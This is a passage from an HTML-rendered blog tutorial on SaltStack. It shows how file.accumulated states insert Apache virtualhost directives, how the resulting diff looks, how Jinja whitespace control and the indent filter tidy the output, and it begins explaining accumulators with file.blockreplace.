&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is an example of thing added in the middle&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteEngine On&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteCond %&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;REQUEST_FILENAME&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;}&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;-d&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteRule ^(.+&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;^/&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;)$  $1/&lt;/span&gt;  &lt;span class=&quot;p-Indicator&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-some-icons-added&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is an example of thing added at the end&amp;#39;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;Alias /icons /path/to/icons&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;Directory /path/to/icons&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;               &lt;span class=&quot;nv&quot;&gt;Order allow&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;deny&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;               &lt;span class=&quot;nv&quot;&gt;Allow from all&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-another-thing&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost-maindir&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;RewriteRule    ^/cgi-bin/imagemap(.*)  $1&lt;/span&gt;  &lt;span class=&quot;p-Indicator&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PT&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;example-a-first-rewrite-rule&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;     &lt;span class=&quot;nv&quot;&gt;example-another-thing-again&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;44&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;file.accumulated&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;45&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- name&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;extra-settings-example-virtualhost-maindir&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;46&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- filename&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;/etc/apache2/sites-available/100-example.com&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;47&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- text&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;48&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;49&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;FilesMatch &amp;quot;\.(gif|jpe&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;g|png)$&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;50&lt;/span&gt;                 &lt;span class=&quot;nv&quot;&gt;ExpiresDefault A2592000&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;51&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;52&lt;/span&gt;         &lt;span class=&quot;nv&quot;&gt;- require_in&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;53&lt;/span&gt;             &lt;span class=&quot;nv&quot;&gt;- file&lt;/span&gt;&lt;span class=&quot;p-Indicator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;100_example_com_virtualhost&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now let's run this new sls:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$# &lt;/span&gt;salt-call -linfo state.sls more-things-for-virtualhost&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You should get a nice diff showing you that all theses states added content on the right place:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+++&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;-21,9&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;+21,41&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;          &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;          &lt;span class=&quot;c&quot;&gt;# Here any extra configuration settings if any:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt;          
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# this is an example of thing added in the middle&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteEngine&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;On&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_FILENAME}  -d
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; ^(.+[^/])$  $1/  [R]
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt;    ^/cgi-bin/imagemap(.*)  $1  [PT]
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# this is another example of thing added in the middle&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;quot;\.(gif|jpe?g|png)$&amp;quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;ExpiresDefault&lt;/span&gt; A2592000
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;    
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;      
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;# Here any extra configuration settings if any:&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;      
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;      
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;# this is an example of thing added at the end&amp;#39;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Alias&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/icons&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/path/to/icons&lt;/span&gt;&amp;gt;
&lt;span class=&quot;lineno&quot;&gt;34&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&amp;lt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Directory&lt;/span&gt; &lt;span class=&quot;sx&quot;&gt;/path/to/icons&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;Order&lt;/span&gt; allow,deny
&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;Allow&lt;/span&gt; from &lt;span class=&quot;k&quot;&gt;all&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;     &lt;span class=&quot;err&quot;&gt;+&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/VirtualHost&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can see that some extra spaces were added by my jinja control commands. We can strip down those whitespaces with jinja's&lt;code&gt;-&lt;/code&gt;. Instead of:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Use:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; -&lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt; -&lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;accumulator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;extra-settings-example-virtualhost-maindir&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;-     &lt;span class=&quot;k&quot;&gt;endfor&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;-   &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;x&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;{%&lt;/span&gt;- &lt;span class=&quot;k&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;%}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And to get the right number of spaces on the resulting file use the indent filter:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-jinja&quot; data-lang=&quot;jinja&quot;&gt;&lt;span class=&quot;lineno&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;{{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;indent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;file.blockreplace using file.accumulated&lt;/h2&gt;

&lt;p&gt;Now if you read the &lt;a href=&quot;/saltstack/english/2014/01/20/saltstack_step_by_step_file_blockreplace/&quot;&gt;previous post on &lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt; you may wonder how to use it with accumulators. It will differ a little from the &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.managed&quot;&gt;&lt;code&gt;file.managed&lt;/code&gt;&lt;/a&gt; usage of accumulators.&lt;/p&gt;

&lt;p&gt;With &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.managed&quot;&gt;&lt;code&gt;file.managed&lt;/code&gt;&lt;/a&gt; you have this &lt;em&gt;accumulator&lt;/em&gt; jinja variable and several keys inside. With &lt;a href=&quot;http://docs.saltstack.com/ref/states/all/salt.states.file.html#salt.states.file.blockreplace&quot;&gt;&lt;code&gt;file.blockreplace&lt;/code&gt;&lt;/a&gt; you have nothing to do.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If one accumulator is targeted on the same file (the same as the one targeted by the blockreplace), then the blockreplace &lt;code&gt;content&lt;/code&gt; attribute will be filled with all the lines contained on this accumulator. Any data directly set in the content attribute is not loose, accumulator data is only added, but the content attribute is not required so it could also be empty.&lt;/li&gt;
